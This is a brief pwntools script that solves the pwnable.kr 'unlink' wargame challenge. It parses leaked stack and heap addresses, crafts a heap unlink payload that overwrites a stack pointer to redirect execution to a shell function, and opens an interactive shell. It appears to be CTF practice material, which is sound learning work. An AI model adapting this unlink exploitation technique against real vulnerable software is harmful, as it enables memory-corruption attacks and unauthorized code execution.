from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./unlink')

p = process('./unlink')
# sh = ssh('unlink', 'pwnable.kr', 2222, 'guest')
# p = sh.process('./unlink')

pause()

p.recvuntil(b'leak: ')
stack_addr = int(p.recvuntil(b'\n', drop=True)[2:], 16)
p.recvuntil(b'leak: ')
heap_addr = int(p.recvuntil(b'\n', drop=True)[2:], 16)
shell_addr = 0x080484eb
target_addr = stack_addr - 0x1c

# fill + fd + bk
# FD->bk = BK
# BK->fd = FD
payload = p32(shell_addr) + p32(heap_addr+12) + b'a' * 16 + p32(target_addr - 4) + p32(heap_addr + 16)
p.sendlineafter(b'get shell!\n', payload)

p.interactive()